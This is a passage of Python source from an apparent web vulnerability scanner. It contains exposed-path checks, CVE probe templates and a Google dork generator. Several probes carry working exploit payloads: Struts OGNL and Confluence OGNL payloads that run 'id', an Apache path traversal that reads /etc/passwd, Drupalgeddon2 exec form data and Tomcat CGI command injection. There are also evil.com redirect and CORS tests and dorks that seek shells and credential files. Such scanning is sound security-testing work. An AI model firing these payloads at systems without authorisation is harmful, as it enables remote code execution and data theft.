        ("/console",                      "Console Exposed",                      "high"),
        ("/cpanel/",                      "cPanel Exposed",                       "high"),
        ("/webmin/",                      "Webmin Exposed",                       "critical"),
        ("/_profiler/",                   "Symfony Profiler Exposed",             "high"),
        # ── Debug & Information Disclosure ──
        ("/phpinfo.php",                  "phpinfo() Exposed",                    "high"),
        ("/info.php",                     "phpinfo (info.php) Exposed",           "high"),
        ("/test.php",                     "test.php Exposed",                     "medium"),
        ("/server-status",                "Apache server-status Exposed",         "medium"),
        ("/server-info",                  "Apache server-info Exposed",           "medium"),
        ("/trace",                        "HTTP TRACE Enabled",                   "medium"),
        ("/debug",                        "Debug Endpoint Exposed",               "high"),
        ("/debug/vars",                   "Go debug/vars Exposed",                "high"),
        ("/debug/pprof",                  "Go pprof Exposed",                     "high"),
        ("/error_log",                    "Error Log Exposed",                    "high"),
        ("/logs/error.log",               "Error Log File Exposed",               "high"),
        ("/log/error.log",                "Error Log Exposed",                    "high"),
        ("/storage/logs/laravel.log",     "Laravel Log Exposed",                  "high"),
        ("/_/metrics",                    "Metrics Endpoint Exposed",             "medium"),
        # ── Spring Boot Actuator (nuclei: misconfigs/springboot) ──
        ("/actuator",                     "Spring Actuator Root Exposed",         "high"),
        ("/actuator/env",                 "Spring Actuator /env (secrets!)",      "critical"),
        ("/actuator/health",              "Spring Actuator /health",              "medium"),
        ("/actuator/metrics",             "Spring Actuator /metrics",             "medium"),
        ("/actuator/mappings",            "Spring Actuator /mappings",            "medium"),
        ("/actuator/beans",               "Spring Actuator /beans",               "medium"),
        ("/actuator/dump",                "Spring Actuator /dump",                "high"),
        ("/actuator/trace",               "Spring Actuator /trace",               "high"),
        ("/actuator/shutdown",            "Spring Actuator /shutdown (!)",        "critical"),
        # ── API & Documentation ──
        ("/graphql",                      "GraphQL Endpoint",                     "medium"),
        ("/graphiql",                     "GraphiQL IDE Exposed",                 "high"),
        ("/playground",                   "GraphQL Playground Exposed",           "high"),
        ("/swagger-ui.html",              "Swagger UI Exposed",                   "medium"),
        ("/swagger-ui/",                  "Swagger UI (alt) Exposed",             "medium"),
        ("/swagger.json",                 "Swagger JSON Exposed",                 "medium"),
        ("/swagger.yaml",                 "Swagger YAML Exposed",                 "medium"),
        ("/api-docs",                     "OpenAPI Docs Exposed",                 "medium"),
        ("/api-docs.json",                "OpenAPI JSON Exposed",                 "medium"),
        ("/openapi.json",                 "OpenAPI Spec Exposed",                 "medium"),
        ("/openapi.yaml",                 "OpenAPI YAML Exposed",                 "medium"),
        ("/.well-known/openid-configuration", "OIDC Config Exposed",             "low"),
        ("/.well-known/jwks.json",        "JWKS (JWT Keys) Exposed",              "medium"),
        # ── Cloud & Infrastructure ──
        ("/docker-compose.yml",           "Docker Compose File Exposed",          "high"),
        ("/docker-compose.yaml",          "Docker Compose YAML Exposed",          "high"),
        ("/Dockerfile",                   "Dockerfile Exposed",                   "medium"),
        ("/.dockerenv",                   "Docker Environment File",              "medium"),
        ("/kubernetes.yml",               "Kubernetes Config Exposed",            "high"),
        ("/.kube/config",                 "Kubernetes Config File Exposed",       "critical"),
        ("/terraform.tfvars",             "Terraform Vars Exposed",               "critical"),
        ("/terraform.tfstate",            "Terraform State Exposed",              "critical"),
        ("/ansible.cfg",                  "Ansible Config Exposed",               "high"),
        # ── Sensitive Files & Configs ──
        ("/.htpasswd",                    ".htpasswd Credentials Exposed",        "critical"),
        ("/.htaccess",                    ".htaccess Exposed",                    "medium"),
        ("/web.config",                   "IIS web.config Exposed",               "high"),
        ("/WEB-INF/web.xml",              "Java WEB-INF/web.xml Exposed",         "critical"),
        ("/WEB-INF/classes/",             "Java Classes Directory Exposed",       "critical"),
        ("/.DS_Store",                    ".DS_Store (macOS) Exposed",            "medium"),
        ("/Thumbs.db",                    "Thumbs.db Exposed",                    "low"),
        ("/crossdomain.xml",              "crossdomain.xml Present",              "low"),
        ("/clientaccesspolicy.xml",       "Silverlight Policy Exposed",           "low"),
        ("/package.json",                 "package.json Exposed",                 "medium"),
        ("/composer.json",                "composer.json Exposed",                "low"),
        ("/Gemfile",                      "Gemfile Exposed",                      "low"),
        ("/requirements.txt",             "requirements.txt Exposed",             "low"),
        # ── Security & Disclosure ──
        ("/.well-known/security.txt",     "security.txt Present",                 "info"),
        ("/security.txt",                 "security.txt (alt) Present",           "info"),
        ("/robots.txt",                   "robots.txt Present",                   "info"),
        ("/sitemap.xml",                  "sitemap.xml Present",                  "info"),
        # ── CI/CD & DevOps ──
        ("/.travis.yml",                  "Travis CI Config Exposed",             "medium"),
        ("/.circleci/config.yml",         "CircleCI Config Exposed",              "medium"),
        ("/.github/workflows/",           "GitHub Actions Workflows",             "low"),
        ("/Jenkinsfile",                  "Jenkinsfile Exposed",                  "medium"),
        ("/.gitlab-ci.yml",               "GitLab CI Config Exposed",             "medium"),
        # ── Takeover / Orphaned ──
        ("/humans.txt",                   "humans.txt Present",                   "info"),
        ("/CHANGELOG.md",                 "Changelog Exposed (version leak)",     "info"),
        ("/README.md",                    "README Exposed",                       "info"),
        ("/INSTALL.md",                   "Install Guide Exposed",                "low"),
    ]

    findings = []

    def check_path(item):
        path, name, severity = item
        for scheme in ["https", "http"]:
            try:
                r = requests.get(
                    f"{scheme}://{domain}{path}",
                    timeout=6,
                    allow_redirects=False,
                    headers={"User-Agent": "Kumo/1.0"},
                    verify=False,
                )
                # Only report real responses — skip pure redirects (301/302)
                # unless they're redirecting to a login page (still meaningful)
                if r.status_code in (200, 403, 401, 500):
                    interesting = True
                    if r.status_code == 200:
                        content = r.text[:500].lower()
                        # Skip generic homepage / catch-all 200s
                        if path in ("/admin/", "/wp-admin/"):
                            if "login" not in content and "password" not in content and "admin" not in content:
                                interesting = False
                        # Skip empty responses
                        if len(r.content) < 50:
                            interesting = False
                    if interesting:
                        return {
                            "path":        path,
                            "name":        name,
                            "severity":    severity,
                            "status":      r.status_code,
                            "size":        len(r.content),
                            "url":         f"{scheme}://{domain}{path}",
                            "description": f"HTTP {r.status_code} — {len(r.content)} bytes",
                        }
                elif r.status_code in (301, 302, 307, 308):
                    # Only report redirects if they go to a login page (interesting!)
                    loc = r.headers.get("location", "").lower()
                    if any(kw in loc for kw in ["login", "signin", "auth", "sso"]):
                        return {
                            "path":        path,
                            "name":        name + " (redirects to login)",
                            "severity":    severity,
                            "status":      r.status_code,
                            "url":         f"{scheme}://{domain}{path}",
                            "description": f"Redirects to: {r.headers.get('location','')[:80]}",
                        }
                break
            except Exception:
                break
        return None

    import requests as req_lib
    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        results = list(ex.map(check_path, EXPOSURE_PATHS))

    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings = sorted(
        [r for r in results if r is not None],
        key=lambda x: severity_order.get(x["severity"], 99)
    )

    counts = {}
    for f in findings:
        sev = f["severity"]
        counts[sev] = counts.get(sev, 0) + 1

    # ── Version Detection + CVE-based exploit templates ──
    # These do content-matching like real Nuclei templates
    exploit_findings = _nuclei_exploit_templates(domain)
    for ef in exploit_findings:
        findings.append(ef)
        s = ef.get("severity", "info")
        counts[s] = counts.get(s, 0) + 1

    findings.sort(key=lambda x: {"critical":0,"high":1,"medium":2,"low":3,"info":4}.get(x.get("severity","info"),5))

    return {
        "total": len(findings),
        "severity_counts": counts,
        "findings": findings,
        "source": "manual_checks",
    }


def _nuclei_exploit_templates(domain):
    """
    CVE-based and version-detection templates inspired by top Nuclei templates.
    Each check does an HTTP probe + content matching, exactly like Nuclei YAML templates.
    Categories:
      - Version fingerprinting (software/version leak → CVE correlation)
      - WordPress plugin/theme CVEs (most common web vulns)
      - Popular CMS exploits (Drupal, Joomla, Magento)
      - Framework exploits (Laravel, Django, Spring, Rails)
      - Exposed admin + default credentials indicators
      - SSRF / open redirect detection
      - Deserialization indicators
    """
    if not HAS_REQUESTS:
        return []

    findings = []
    base_https = f"https://{domain}"
    base_http  = f"http://{domain}"

    import re as _re

    UA = "Mozilla/5.0 Kumo/1.0"
    HEADERS = {"User-Agent": UA, "Accept": "*/*"}

    def probe(path, method="GET", data=None, extra_headers=None, timeout=6, schemes=None):
        """Single HTTP probe, returns (response, base_url) or (None, None)."""
        for base in (schemes or [base_https, base_http]):
            try:
                h = dict(HEADERS)
                if extra_headers:
                    h.update(extra_headers)
                if method == "POST":
                    r = requests.post(f"{base}{path}", data=data, headers=h,
                                      timeout=timeout, verify=False, allow_redirects=False)
                else:
                    r = requests.get(f"{base}{path}", headers=h,
                                     timeout=timeout, verify=False, allow_redirects=False)
                return r, base
            except Exception:
                pass
        return None, None

    def add(name, severity, path, description, cve=None, base=base_https):
        findings.append({
            "name":        name,
            "severity":    severity,
            "path":        path,
            "url":         f"{base}{path}",
            "description": description + (f" [{cve}]" if cve else ""),
            "status":      "",
            "source":      "exploit_template",
        })

    def matches(text, *patterns):
        return any(_re.search(p, text, _re.I) for p in patterns)

    # ═══════════════════════════════════════════════════════
    # 1. VERSION DETECTION — fingerprint software from responses
    # ═══════════════════════════════════════════════════════

    # WordPress version detection
    r, base = probe("/feed/")
    if r and r.status_code == 200:
        m = _re.search(r'<generator>https?://wordpress\.org/\?v=([\d.]+)</generator>', r.text)
        if m:
            ver = m.group(1)
            findings.append({
                "name":        f"WordPress {ver} Detected",
                "severity":    "info",
                "path":        "/feed/",
                "url":         f"{base}/feed/",
                "description": f"WordPress version {ver} identified via /feed/ generator tag. Check for known CVEs for this version.",
                "status":      200,
                "source":      "version_detection",
            })

    # WordPress readme version
    r, base = probe("/readme.html")
    if r and r.status_code == 200:
        m = _re.search(r'[Vv]ersion\s+([\d.]+)', r.text)
        if m:
            findings.append({
                "name":     f"WordPress {m.group(1)} Version Leak",
                "severity": "info",
                "path":     "/readme.html",
                "url":      f"{base}/readme.html",
                "description": f"WordPress version {m.group(1)} exposed in readme.html",
                "status":   200,
                "source":   "version_detection",
            })

    # Drupal version
    r, base = probe("/CHANGELOG.txt")
    if r and r.status_code == 200 and "Drupal" in r.text:
        m = _re.search(r'Drupal ([\d.]+)', r.text)
        ver = m.group(1) if m else "unknown"
        add(f"Drupal {ver} Changelog Exposed", "medium", "/CHANGELOG.txt",
            f"Drupal version {ver} revealed via CHANGELOG.txt")

    r, base = probe("/core/CHANGELOG.txt")
    if r and r.status_code == 200 and "Drupal" in r.text:
        m = _re.search(r'Drupal ([\d.]+)', r.text)
        ver = m.group(1) if m else "unknown"
        add(f"Drupal {ver} Core Changelog", "medium", "/core/CHANGELOG.txt",
            f"Drupal version {ver} via core/CHANGELOG.txt")

    # Joomla version
    for path in ["/administrator/manifests/files/joomla.xml", "/language/en-GB/en-GB.xml"]:
        r, base = probe(path)
        if r and r.status_code == 200:
            m = _re.search(r'<version>([\d.]+)</version>', r.text)
            if m:
                add(f"Joomla {m.group(1)} Version Exposed", "medium", path,
                    f"Joomla version {m.group(1)} exposed in manifest file")
                break

    # Magento version
    r, base = probe("/magento_version")
    if r and r.status_code == 200:
        add("Magento Version Exposed", "medium", "/magento_version",
            f"Magento version info: {r.text[:100]}")

    r, base = probe("/RELEASE_NOTES.txt")
    if r and r.status_code == 200 and matches(r.text, "Magento"):
        add("Magento Release Notes Exposed", "medium", "/RELEASE_NOTES.txt",
            "Magento version leaked via RELEASE_NOTES.txt")

    # Laravel version via exception page
    r, base = probe("/_ignition/health-check")
    if r and r.status_code == 200 and matches(r.text, "laravel", "ignition"):
        add("Laravel Ignition Health Check", "high", "/_ignition/health-check",
            "Laravel Ignition debug endpoint is exposed")

    # Laravel Ignition RCE — CVE-2021-3129
    r, base = probe("/_ignition/execute-solution")
    if r and r.status_code in (200, 405, 500):
        body = r.text[:500]
        if matches(body, "ignition", "solution", "runnable"):
            add("Laravel Ignition RCE Endpoint", "critical", "/_ignition/execute-solution",
                "Laravel Ignition /_ignition/execute-solution potentially exposed (CVE-2021-3129)",
                cve="CVE-2021-3129")

    # Spring Boot version via /info
    r, base = probe("/info")
    if r and r.status_code == 200:
        try:
            j = r.json()
            if "build" in j or "spring" in str(j).lower():
                ver = j.get("build", {}).get("version", "unknown")
                add(f"Spring Boot /info Exposed (v{ver})", "medium", "/info",
                    f"Spring Boot /info endpoint exposes version: {ver}")
        except Exception:
            pass

    # Apache Struts version detection
    r, base = probe("/struts/webconsole.html")
    if r and r.status_code == 200:
        add("Apache Struts Webconsole Exposed", "critical", "/struts/webconsole.html",
            "Apache Struts developer console is accessible")

    # ═══════════════════════════════════════════════════════
    # 2. WORDPRESS PLUGIN CVEs (top 20 most exploited)
    # ═══════════════════════════════════════════════════════

    wp_plugin_checks = [
        # (path_indicator, plugin_name, severity, description, cve)
        ("/wp-content/plugins/all-in-one-seo-pack/", "All-in-One SEO", "medium",
         "AIOSEO plugin detected — check for SQLi CVEs", "CVE-2022-0422"),
        ("/wp-content/plugins/contact-form-7/", "Contact Form 7", "medium",
         "CF7 detected — check for file upload bypass", "CVE-2020-35489"),
        ("/wp-content/plugins/wp-file-manager/", "WP File Manager", "critical",
         "WP File Manager plugin detected — unauthenticated file upload (CVE-2020-25213)",
         "CVE-2020-25213"),
        ("/wp-content/plugins/duplicator/installer/", "Duplicator Installer",
         "critical", "Duplicator installer left accessible — info disclosure", "CVE-2020-11738"),
        ("/wp-content/plugins/woocommerce/", "WooCommerce", "info",
         "WooCommerce detected — ensure updated to latest version", None),
        ("/wp-content/plugins/elementor/", "Elementor", "info",
         "Elementor detected — check for stored XSS CVEs", None),
        ("/wp-content/plugins/revslider/", "Revolution Slider", "critical",
         "Revolution Slider detected — LFI/arbitrary file read", "CVE-2014-9734"),
        ("/wp-content/plugins/gravityforms/", "Gravity Forms", "medium",
         "Gravity Forms detected — check for unauthenticated file upload", None),
        ("/wp-content/plugins/backup-backup/", "Backup Migration", "high",
         "Backup plugin detected — path traversal vulnerability", "CVE-2023-6553"),
        ("/wp-content/plugins/wp-automatic/", "WP Automatic", "critical",
         "WP Automatic plugin detected — SQLi vulnerability", "CVE-2024-27956"),
        ("/wp-content/plugins/litespeed-cache/", "LiteSpeed Cache", "high",
         "LiteSpeed Cache detected — unauthenticated account takeover", "CVE-2024-28000"),
        ("/wp-content/plugins/really-simple-ssl/", "Really Simple SSL", "critical",
         "Really Simple SSL detected — auth bypass (2FA bypass)", "CVE-2024-10924"),
        ("/wp-content/plugins/the-events-calendar/", "The Events Calendar", "medium",
         "Events Calendar detected — SQLi vulnerability", "CVE-2024-8275"),
        ("/wp-content/plugins/anti-spam/", "Formidable Forms/Anti-Spam", "high",
         "Plugin detected — check for privilege escalation", None),
        ("/wp-content/plugins/wpforms-lite/", "WPForms", "medium",
         "WPForms detected — check for email injection", None),
    ]

    def check_wp_plugin(item):
        path, name, sev, desc, cve = item
        r, base = probe(path)
        if r and r.status_code in (200, 301, 302, 403):
            return {
                "name":        f"{name} Plugin Detected",
                "severity":    sev,
                "path":        path,
                "url":         f"{base}{path}",
                "description": desc,
                "status":      r.status_code,
                "source":      "wp_plugin_cve",
                "cve":         cve or "",
            }
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        wp_results = list(ex.map(check_wp_plugin, wp_plugin_checks))
    findings.extend([r for r in wp_results if r])

    # ═══════════════════════════════════════════════════════
    # 3. POPULAR CVE EXPLOIT TEMPLATES
    # ═══════════════════════════════════════════════════════

    # CVE-2017-5638 — Apache Struts RCE (Content-Type injection)
    r, base = probe("/", extra_headers={
        "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}"
    })
    if r and r.status_code != 400:
        body = r.text[:200]
        if matches(body, r'uid=\d+', "root", "www-data"):
            add("Apache Struts RCE (CVE-2017-5638)", "critical", "/",
                "Apache Struts Content-Type OGNL injection RCE confirmed",
                cve="CVE-2017-5638", base=base)

    # CVE-2021-41773 — Apache HTTP Server Path Traversal
    r, base = probe("/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
    if r and r.status_code == 200 and matches(r.text, r"root:.*:/bin/"):
        add("Apache Path Traversal RCE (CVE-2021-41773)", "critical",
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "Apache 2.4.49 path traversal - /etc/passwd readable",
            cve="CVE-2021-41773", base=base)

    # CVE-2022-22965 — Spring4Shell
    r, base = probe("/", extra_headers={
        "suffix": "%>//",
        "c1":     "Runtime",
        "c2":     "<%",
        "DNT":    "1",
    })
    if r and r.status_code in (200, 400, 500):
        r2, base2 = probe("/shell.jsp")
        if r2 and r2.status_code == 200:
            add("Spring4Shell (CVE-2022-22965)", "critical", "/shell.jsp",
                "Spring Framework RCE - shell.jsp may have been created",
                cve="CVE-2022-22965", base=base2)

    # CVE-2021-44228 — Log4Shell detection (via header injection)
    # Just check if the server is vulnerable by looking for Java/Spring indicators first
    r, base = probe("/")
    if r and matches(r.headers.get("server","") + r.headers.get("x-powered-by",""),
                     "java", "spring", "tomcat", "jetty", "wildfly", "jboss"):
        findings.append({
            "name":        "Log4j / Java Server Detected (CVE-2021-44228 Risk)",
            "severity":    "high",
            "path":        "/",
            "url":         f"{base}/",
            "description": "Java-based server detected — verify Log4Shell (CVE-2021-44228) is patched. Server header: " + r.headers.get("server","") + " " + r.headers.get("x-powered-by",""),
            "status":      r.status_code,
            "source":      "exploit_template",
            "cve":         "CVE-2021-44228",
        })

    # CVE-2019-11043 — PHP-FPM RCE (Nginx + PHP-FPM)
    r, base = probe("/index.php%0a")
    if r and r.status_code == 200 and matches(r.headers.get("content-type",""), "php"):
        add("PHP-FPM Nginx RCE (CVE-2019-11043)", "critical",
            "/index.php%0a",
            "PHP-FPM Nginx path info bug may allow RCE",
            cve="CVE-2019-11043", base=base)

    # CVE-2018-7600 — Drupal RCE "Drupalgeddon2"
    r, base = probe("/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                    method="POST",
                    data={"form_id": "user_register_form", "_drupal_ajax": "1",
                          "mail[#post_render][]": "exec", "mail[#type]": "markup",
                          "mail[#markup]": "echo PWNED"})
    if r and r.status_code in (200, 500) and matches(r.text, "PWNED", "drupalgeddon"):
        add("Drupalgeddon2 RCE (CVE-2018-7600)", "critical",
            "/user/register",
            "Drupal 6/7/8 remote code execution via form API",
            cve="CVE-2018-7600", base=base)

    # CVE-2020-14882 — Oracle WebLogic Unauth RCE
    r, base = probe("/console/images/%252E%252E%252Fconsole.portal")
    if r and r.status_code == 200 and matches(r.text, "WebLogic", "Oracle"):
        add("Oracle WebLogic Console Bypass (CVE-2020-14882)", "critical",
            "/console/images/%252E%252E%252Fconsole.portal",
            "Oracle WebLogic Server unauthenticated admin console access",
            cve="CVE-2020-14882", base=base)

    # CVE-2022-26134 — Confluence OGNL RCE
    r, base = probe("/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/")
    if r and r.status_code in (200, 400) and matches(r.text, "Confluence", "Atlassian"):
        add("Confluence OGNL RCE (CVE-2022-26134)", "critical",
            "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/",
            "Atlassian Confluence OGNL injection RCE",
            cve="CVE-2022-26134", base=base)

    # CVE-2021-26084 — Confluence Server OGNL injection
    r, base = probe("/pages/doenterpagevariables.action")
    if r and r.status_code in (200, 302) and matches(r.text, "confluence", "atlassian"):
        add("Confluence Server Exposed (CVE-2021-26084 Risk)", "high",
            "/pages/doenterpagevariables.action",
            "Confluence Server detected — check for CVE-2021-26084 OGNL injection",
            cve="CVE-2021-26084", base=base)

    # CVE-2019-0232 — Apache Tomcat CGI enableCmdLineArguments RCE
    r, base = probe("/cgi-bin/test.bat?&dir")
    if r and r.status_code == 200 and matches(r.text, "Directory of", "Volume in drive"):
        add("Tomcat CGI RCE (CVE-2019-0232)", "critical",
            "/cgi-bin/test.bat?&dir",
            "Apache Tomcat CGI enableCmdLineArguments RCE",
            cve="CVE-2019-0232", base=base)

    # ═══════════════════════════════════════════════════════
    # 4. DEFAULT CREDENTIALS / ADMIN PANEL DETECTION
    # ═══════════════════════════════════════════════════════

    # Jenkins anonymous access
    r, base = probe("/jenkins/api/json")
    if r and r.status_code == 200 and matches(r.text, "_class", "jenkins"):
        add("Jenkins Unauthenticated API Access", "critical", "/jenkins/api/json",
            "Jenkins API accessible without authentication — full system compromise risk")

    r, base = probe("/api/json")
    if r and r.status_code == 200 and matches(r.text, "Jenkins", "hudson"):
        add("Jenkins Root API Anonymous Access", "critical", "/api/json",
            "Jenkins root API accessible without auth")

    # Grafana anonymous access + version
    r, base = probe("/api/health")
    if r and r.status_code == 200:
        try:
            j = r.json()
            if "grafana" in str(j).lower() or "database" in j:
                ver = j.get("version", "unknown")
                add(f"Grafana API Accessible (v{ver})", "high", "/api/health",
                    f"Grafana health endpoint accessible — version {ver}")
        except Exception:
            pass

    # Kibana
    r, base = probe("/app/kibana")
    if r and r.status_code == 200 and matches(r.text, "kibana", "elastic"):
        add("Kibana Dashboard Exposed", "high", "/app/kibana",
            "Kibana is accessible — may expose Elasticsearch data")

    # Elasticsearch cluster info
    r, base = probe(":9200/", schemes=[f"http://{domain}"]) or probe("/")
    if r and r.status_code == 200:
        try:
            j = r.json()
            if "cluster_name" in j or "elasticsearch" in str(j).lower():
                ver = j.get("version", {}).get("number", "unknown")
                add(f"Elasticsearch Exposed (v{ver})", "critical", "/:9200/",
                    f"Elasticsearch {ver} cluster accessible without auth — full data exposure")
        except Exception:
            pass

    # MongoDB Express
    r, base = probe("/db/admin/")
    if r and r.status_code == 200 and matches(r.text, "mongo", "collection", "database"):
        add("Mongo Express Exposed", "critical", "/db/admin/",
            "Mongo Express web interface is accessible — full database access")

    # Hadoop YARN RCE
    r, base = probe("/ws/v1/cluster/info", schemes=[f"http://{domain}"])
    if r and r.status_code == 200 and matches(r.text, "hadoop", "yarn", "clusterInfo"):
        add("Hadoop YARN REST API Exposed", "critical", "/ws/v1/cluster/info",
            "Hadoop YARN ResourceManager API is accessible — potential RCE via app submission")

    # Redis (via HTTP probe on port 6379 — limited check)
    # Consul API
    r, base = probe("/v1/agent/self", schemes=[f"http://{domain}"])
    if r and r.status_code == 200 and matches(r.text, "consul", "Config", "NodeName"):
        add("Consul Agent API Exposed", "critical", "/v1/agent/self",
            "HashiCorp Consul agent API is accessible without authentication")

    # ═══════════════════════════════════════════════════════
    # 5. SSRF + OPEN REDIRECT DETECTION
    # ═══════════════════════════════════════════════════════

    # Test common open redirect parameters
    redirect_params = [
        "?redirect=https://evil.com",
        "?url=https://evil.com",
        "?next=https://evil.com",
        "?return=https://evil.com",
        "?goto=https://evil.com",
        "?returnUrl=https://evil.com",
        "?continue=https://evil.com",
        "?dest=https://evil.com",
    ]
    for param in redirect_params[:3]:  # check first 3 to save time
        r, base = probe(f"/{param}")
        if r and r.status_code in (301, 302):
            loc = r.headers.get("location", "")
            if "evil.com" in loc:
                add("Open Redirect Detected", "medium", f"/{param}",
                    f"Open redirect: {loc[:100]}")
                break

    # ═══════════════════════════════════════════════════════
    # 6. MISCONFIGURATION DETECTION
    # ═══════════════════════════════════════════════════════

    # CORS wildcard misconfiguration
    r, base = probe("/api/", extra_headers={"Origin": "https://evil.com"})
    if r:
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "")
        if acao == "*" and "true" in acac.lower():
            add("CORS Wildcard + Credentials (Critical)", "critical", "/api/",
                "Access-Control-Allow-Origin: * with Credentials: true — authentication bypass risk")
        elif acao == "https://evil.com":
            add("CORS Arbitrary Origin Reflected", "high", "/api/",
                f"CORS reflects arbitrary Origin: {acao} — potential credential theft")

    # HTTP TRACE method enabled
    r, base = probe("/", method="GET", extra_headers={"X-Custom-Header": "trace-test"})
    try:
        trace_r = requests.request("TRACE", f"{base}/", headers=HEADERS,
                                   timeout=5, verify=False, allow_redirects=False)
        if trace_r.status_code == 200 and "trace-test" in trace_r.text:
            add("HTTP TRACE Method Enabled", "medium", "/",
                "TRACE method enabled — XST (Cross-Site Tracing) attack possible")
    except Exception:
        pass

    # Host header injection
    r, base = probe("/", extra_headers={"Host": "evil.com"})
    if r and r.status_code == 200:
        if "evil.com" in r.text:
            add("Host Header Injection", "high", "/",
                "Server reflects arbitrary Host header value — password reset poisoning risk")

    # Clickjacking — missing X-Frame-Options
    r, base = probe("/")
    if r and r.status_code == 200:
        xfo = r.headers.get("x-frame-options", "")
        csp = r.headers.get("content-security-policy", "")
        if not xfo and "frame-ancestors" not in csp:
            add("Clickjacking — No X-Frame-Options", "medium", "/",
                "No X-Frame-Options or CSP frame-ancestors — site can be embedded in iframes")

    return findings




# ═══════════════════════════════════════════════════════════════
# MODULE: DORKS
# ═══════════════════════════════════════════════════════════════

def generate_dorks(domain):
    return {
        "File & Directory Discovery": [
            ("Directory Listings", f'site:{domain} intitle:"index of"'),
            ("Config Files", f'site:{domain} ext:xml | ext:conf | ext:cnf | ext:cfg | ext:ini | ext:env'),
            ("Database Files", f'site:{domain} ext:sql | ext:dbf | ext:mdb'),
            ("Log Files", f'site:{domain} ext:log'),
            ("Backup Files", f'site:{domain} ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup'),
            ("Exposed Documents", f'site:{domain} ext:doc | ext:docx | ext:pdf | ext:rtf | ext:ppt | ext:csv | ext:xls'),
            (".env Files", f'site:{domain} ext:env | inurl:.env'),
            (".git Exposure", f'site:{domain} inurl:".git" intitle:"index of"'),
            ("YAML Configs", f'site:{domain} ext:yml | ext:yaml inurl:config'),
            ("/etc/ Listing", f'site:{domain} intitle:"index of" "/etc/"'),
            ("pom.xml", f'site:{domain} inurl:pom.xml'),
            ("PHP Config", f'site:{domain} inurl:conf.php'),
            ("download.php", f'site:{domain} inurl:download.php'),
        ],
        "WordPress & CMS": [
            ("WordPress Sites", f'site:{domain} inurl:wp-content | inurl:wp-includes'),
            ("WP Login", f'site:{domain} inurl:wp-login.php'),
            ("WP Config Backup", f'site:{domain} inurl:wp-config ext:bak | ext:txt | ext:old'),
            ("WP Debug Log", f'site:{domain} inurl:wp-content/debug.log'),
            ("WP Uploads", f'site:{domain} intitle:"index of" "wp-content/uploads"'),
            ("WP Plugin Vulns", f'site:{domain} inurl:wp-content/plugins/contact-form-7'),
            ("WP xmlrpc.php", f'site:{domain} inurl:xmlrpc.php'),
            ("Drupal Login", f'site:{domain} inurl:user/login intitle:Drupal'),
            ("Joomla DB", f'site:{domain} inurl:joomla/database'),
        ],
        "Database & SQL": [
            ("SQL Errors", f'site:{domain} intext:"sql syntax near" | intext:"Warning: mysql_connect()" | intext:"Warning: pg_connect()"'),
            ("SQL Files", f'site:{domain} ext:sql intext:insert | intext:select'),
            ("MySQL Config", f'site:{domain} ext:cnf intext:password'),
            ("SQL Dumps", f'site:{domain} intitle:"index of" ext:sql | ext:dump'),
            ("MongoDB", f'site:{domain} inurl:mongodb | inurl:27017'),
        ],
        "Auth & Admin": [
            ("Login Pages", f'site:{domain} inurl:login | inurl:signin | inurl:auth'),
            ("Admin Pages", f'site:{domain} inurl:admin | inurl:administrator'),
            ("Admin Portal ASPX", f'site:{domain} inurl:admin.aspx'),
            ("phpMyAdmin", f'site:{domain} inurl:phpmyadmin'),
            ("cPanel", f'site:{domain} inurl:cpanel | inurl:2082 | inurl:2083'),
            ("Admin Backups", f'site:{domain} inurl:admin ext:bak | ext:old'),
        ],
        "Vulnerabilities": [
            ("phpinfo()", f'site:{domain} ext:php intitle:phpinfo "published by the PHP Group"'),
            ("Backdoors/Shells", f'site:{domain} inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd'),
            ("Install/Setup", f'site:{domain} inurl:install | inurl:setup ext:php'),
            ("Open Redirects", f'site:{domain} inurl:url= | inurl:return= | inurl:next= | inurl:redirect='),
            ("Apache Struts", f'site:{domain} ext:action | ext:struts | ext:do'),
            (".htaccess", f'site:{domain} inurl:.htaccess'),
            ("crossdomain.xml", f'site:{domain} inurl:crossdomain.xml'),
            ("File Upload", f'site:{domain} inurl:upload | inurl:file_upload'),
            ("SSRF Params", f'site:{domain} inurl:url= | inurl:uri= | inurl:path= | inurl:src='),
            ("Debug/Trace", f'site:{domain} intext:"stack trace" | intext:"traceback"'),
            ("Server Status", f'site:{domain} inurl:server-status | inurl:server-info'),
            ("GeoServer", f'site:{domain} inurl:geoserver'),
            ("ArcGIS REST", f'site:{domain} inurl:ArcGIS/rest/services'),
        ],
        "API & Config": [
            ("API Endpoints", f'site:{domain} inurl:api | inurl:v1 | inurl:v2 | inurl:graphql'),
            ("Swagger/OpenAPI", f'site:{domain} inurl:swagger | inurl:api-docs'),
            ("JWKS Files", f'site:{domain} inurl:jwks-rsa | inurl:.well-known/jwks'),
            ("docker-compose", f'site:{domain} inurl:docker-compose.yml'),
            ("Firebase Config", f'site:{domain} inurl:firebaseio.com'),
            ("GraphQL", f'site:{domain} inurl:graphiql | inurl:graphql/console'),
            ("JSON-RPC", f'site:{domain} inurl:jsonrpc'),
            ("main.yml", f'site:{domain} inurl:main.yml'),
        ],
        "OSINT & Social": [
            ("Pastebin", f'site:pastebin.com "{domain}"'),
            ("LinkedIn", f'site:linkedin.com employees "{domain}"'),
            ("GitHub Code", f'site:github.com "{domain}"'),
            ("Reddit", f'site:reddit.com "{domain}"'),
